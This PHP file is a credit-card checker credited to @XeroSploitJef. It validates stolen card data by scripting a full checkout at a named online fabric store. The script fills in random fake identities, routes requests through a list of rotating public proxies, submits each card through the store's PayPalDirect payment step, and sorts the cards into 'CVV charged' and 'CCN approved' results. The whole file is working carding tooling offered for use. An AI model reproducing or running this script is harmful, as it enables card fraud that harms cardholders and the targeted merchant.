<?php

// API BY @XeroSploitJef 

// Recommendations:
// Use paid proxies.
// Change the article if necessary.

//  Recomendaciones:
//  Usar proxys de paga.
//  Cambiar el articulo si es necesario.

// Join my channels:
// https://t.me/XeroSploitJefTutos
// https://t.me/Oficial_Scorpions

// Sitio usado de https://t.me/RG4sites

// Contact me: https://t.me/XeroSploitJef

require 'function.php';
include "CurlX.php";

$MADEBY = "@XeroSploitJef";

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cctype = substr($cc, 0, 1);
if ($cctype == '3') {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Solo soporta Visa y MasterCard ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    exit();
} elseif ($cctype == '4') {
    $card_type = 'Visa';
} elseif ($cctype == '5') {
    $card_type = 'MasterCard';
} elseif ($cctype == '6') {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ Solo soporta Visa y MasterCard ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    exit();
} else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ todo bien bro ?? ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    exit();
}


//==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$random = curl_exec($ch);
$data = json_decode($random, true);
$first = $data["results"][0]["name"]["first"];
$last = $data["results"][0]["name"]["last"];
$streetnumber = $data["results"][0]["location"]["street"]["number"];
$street .= "$streetnumber ".$data["results"][0]["location"]["street"]["name"];
$city = $data["results"][0]["location"]["city"];
$state = $data["results"][0]["location"]["state"];
$postcode = $data["results"][0]["location"]["postcode"];

$streetr = urlencode($street);
$cityr = urlencode($city);
$stater = urlencode($state);
$statesr = urlencode($states);
$postcoder = urlencode($postcode);

$jsonData = '{"1":"AA (Armed Forces Americas)",
    "2":"AE (Armed Forces Europe)",
    "3":"Alabama",
    "4":"Alaska",
    "5":"American Samoa",
    "6":"AP (Armed Forces Pacific)",
    "7":"Arizona",
    "8":"Arkansas",
    "9":"California",
    "10":"Colorado",
    "11":"Connecticut",
    "12":"Delaware",
    "13":"District of Columbia",
    "14":"Federated States of Micronesia",
    "15":"Florida",
    "16":"Georgia",
    "17":"Guam",
    "18":"Hawaii",
    "19":"Idaho",
    "20":"Illinois",
    "21":"Indiana",
    "22":"Iowa",
    "23":"Kansas",
    "24":"Kentucky",
    "25":"Louisiana",
    "26":"Maine",
    "27":"Marshall Islands",
    "28":"Maryland",
    "29":"Massachusetts",
    "30":"Michigan",
    "31":"Minnesota",
    "32":"Mississippi",
    "33":"Missouri",
    "34":"Montana",
    "35":"Nebraska",
    "36":"Nevada",
    "37":"New Hampshire",
    "38":"New Jersey",
    "39":"New Mexico",
    "40":"New York",
    "41":"North Carolina",
    "42":"North Dakota",
    "43":"Northern Mariana Islands",
    "44":"Ohio",
    "45":"Oklahoma",
    "46":"Oregon",
    "47":"Palau",
    "48":"Pennsylvania",
    "49":"Puerto Rico",
    "50":"Rhode Island",
    "51":"South Carolina",
    "52":"South Dakota",
    "53":"Tennessee",
    "54":"Texas",
    "55":"Utah",
    "56":"Vermont",
    "57":"Virgin Islands",
    "58":"Virginia",
    "59":"Washington",
    "60":"West Virginia",
    "61":"Wisconsin",
    "62":"Wyoming"
}';

$estados = json_decode($jsonData, true);
$codigoEstado = array_search($state, $estados);



$mescont=strlen($mes);
$anocont=strlen($ano);

if ($anocont<=2){
    $ano = "20$ano";
}   if ($mescont<=1){
    $mes = "0$mes";
}
$mescont=strlen($mes);
$anocont=strlen($ano);

if ($anocont<=4){
    $sub_ano = substr($ano, -2);
}   if ($mescont<=2){
    $sub_mes = substr($mes, -1);
}   if ($mes>=10) {
    $sub_mes = $mes;
}

//=======================[Proxys]=============================//

 elimina esto y el de abajo si usaras proxys

$ip = array(
    'https://190.104.146.244:999',
    'https://140.246.149.224:8888',
    'https://101.255.94.161:8080',
    'https://117.2.28.235:55443',
    'https://27.72.28.32:8008',
    'https://131.196.114.9:6969',
    'https://202.141.233.166:48995',
    'https://47.112.102.20:80',
    'https://13.125.194.158:10040',
    'https://187.190.118.141:999',
    'https://20.47.108.204:8888',
    'https://47.115.6.196:3389',
    'https://101.51.197.149:8080',
    'https://200.85.42.194:999',
    'https://125.162.75.248:8080',
    'https://183.87.158.141:8080',
    'https://118.71.225.130:4001',
    'http://78.36.198.158:80',
    'https://103.52.210.237:80',
    'http://177.234.172.30:3128',
    'https://118.99.103.228:8080',
    'http://202.83.173.114:8080',
    'https://36.65.38.142:8080',
    'http://128.199.202.122:3128',
    'https://47.100.14.22:9006',
    'http://198.199.86.11:3128',
    'https://103.47.238.157:55243',
    'http://182.72.150.242:8080',
    'https://186.101.48.195:83',
    'http://209.97.150.167:8080'
);

$socks = array_rand($ip);
$proxys = $ip[$socks];
$proxy_parts = explode(':', $proxys); 

$ip_address = $proxy_parts[0];
$puerto = $proxy_parts[1];
$proxy = "$ip_address:$puerto";
$username = $proxy_parts[2];
$password = $proxy_parts[3];
# este igual

=======================[Proxys END]=============================//
$phone = rand(1000000, 9999999);
$num = rand(1000, 9999);
$num2 = rand(100, 999);

$Proxy = ["METHOD" => "CUSTOM",
"SERVER" => "$ip_address:$puerto",
"AUTH" => "$username:$password"];
$Proxy = NULL;# este lo comentas son doble /

# -------------------- [1 REQ] -------------------#

$Xero = uniqid();

$HEADERS = [
    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
    "Host: www.legaleriste.com",
    "Origin: https://www.legaleriste.com",
    "Referer: https://www.legaleriste.com/"];

$curl = CurlX::Get("https://www.legaleriste.com/en/leaf-knit-chiffon-fabric-sample", $HEADERS, $Xero, $Proxy)->body;

# -------------------- [1 REQ] -------------------#
if (empty($curl)){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ REINTENTAR (1) ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    unlink('/cookie'.$Xero.'.txt');
    exit();
}

# -------------------- [2 REQ] -------------------#


$URL =  'https://www.legaleriste.com/en/addproducttocart/details/751090/1';
$POST = 'product_attribute_751090_1_662279=4442158&addtocart_751090.EnteredQuantity=1';
$curl = CurlX::Post($URL, $POST, $HEADERS, $Xero, $Proxy)->body;

# -------------------- [2 REQ] -------------------#
if (empty($curl)){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ REINTENTAR (2)➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    unlink('/cookie'.$Xero.'.txt');
    exit();
}
# -------------------- [3 REQ] -------------------#

$URL =  'https://www.legaleriste.com/en/cart';
$POST = '------WebKitFormBoundaryg9ZCbCTGKENAZjRz
Content-Disposition: form-data; name="SelectedFoundation"


------WebKitFormBoundaryg9ZCbCTGKENAZjRz
Content-Disposition: form-data; name="checkout"

checkout
------WebKitFormBoundaryg9ZCbCTGKENAZjRz--';
$curl = CurlX::Post($URL, $POST, $HEADERS, $Xero, $Proxy)->body;

if (empty($curl)){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ REINTENTAR (3)➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    unlink('/cookie'.$Xero.'.txt');
    exit();
}
//=======================[4 REQ]==============================//

$URL =  'https://www.legaleriste.com/reCalculateTax';
$POST = 'Id=0&Email='.$first.''.$last.''.$num.'%40gmail.com&FirstName='.$first.'&LastName='.$last.'&Company=&Address1='.$streetr.'&CountryId=1&City='.$cityr.'&StateProvinceId='.$codigoEstado.'&ZipPostalCode='.$postcoder.'&shippingCountryId=1';
$curl = CurlX::Post($URL, $POST, $HEADERS, $Xero, $Proxy)->body;

$billingAddress = CurlX::ParseString($curl, '"billingAddress":','}');
# -------------------- [4 REQ] -------------------#
if (empty($curl)){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ REINTENTAR (4)➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
    unlink('/cookie'.$Xero.'.txt');
    exit();
}
//=======================[5 REQ]==============================//

$URL =  'https://www.legaleriste.com/checkout/checkoutinfo';
$POST = 'ShippingAddress.Id=0&ShippingAddress.FirstName='.$first.'&ShippingAddress.LastName='.$last.'&ShippingAddress.Email='.$first.''.$last.''.$num.'%40gmail.com&ShippingAddress.PhoneNumber=224'.$phone.'&ShippingAddress.Company=&ShippingAddress.Address1='.$streetr.'&ShippingAddress.CountryId=1&ShippingAddress.City='.$cityr.'&ShippingAddress.StateProvinceId='.$codigoEstado.'&ShippingAddress.ZipPostalCode='.$postcoder.'&PaymentMethodSystemName=Payments.PayPalDirect&SkipPaymentMethod=false&CreditCardType='.$card_type.'&CardholderName='.$first.'&CardNumber='.substr($cc, 0, 4).'+'.substr($cc, 4, -8).'+'.substr($cc, 8, -4).'+'.substr($cc, -4).'&ExpireMonth='.$mes.'&ExpireYear='.$ano.'&CardCode='.$cvv.'&SameAsShippingAddress=true&SameAsShippingAddress=false&BillingAddress.Id='.$billingAddress.'&BillingAddress.FirstName='.$first.'&BillingAddress.LastName='.$last.'&BillingAddress.Email='.$first.''.$last.''.$num.'%40gmail.com&BillingAddress.PhoneNumber=224'.$phone.'&BillingAddress.Company=&BillingAddress.Address1='.$streetr.'&BillingAddress.CountryId=1&BillingAddress.City='.$cityr.'&BillingAddress.StateProvinceId='.$codigoEstado.'&BillingAddress.ZipPostalCode='.$postcoder.'&shippingoption=USA.TP&submit.confirm=';
$result5 = CurlX::Post($URL, $POST, $HEADERS, $Xero, $Proxy)->body;
$msj = CurlX::ParseString($result5, 'Payment error: ','<');

//=======================[MADE BY]==============================//

unlink('/cookie'.$Xero.'.txt');

//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result5, 'transactionsuccessful%3dtrue')) || (strpos($result5, "Order status: <br class=\"visible-xs\" />placed"))){
    echo '<br><span class="badge badge-success">#CVV ✅ </span> : ' . $lista . ' ➜  Charged 15$ ✅ ➜ </span> ➜ API BY: ' . $MADEBY . '</br>';
}


# - [CCN Responses ] - #

elseif (strpos($result5, 'Please enter a valid Credit Card Verification Number')){
    echo '<br><span class="badge badge-warning">#CCN ✅ </span> : ' . $lista . ' ➜  Approved ✅ ➜ </span> ➜ ' . $msj . ' ➜ API BY: ' . $MADEBY . '</br>';
}
#-[CCN Responses END ]- #

# - [Reprovada,Decline Responses END ] - #

elseif (empty($msj)){
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ REINTENTAR (5)➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ API BY: ' . $MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ ' . $msj . ' ➜ API BY: ' . $MADEBY . '</br>';
}
# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//

?>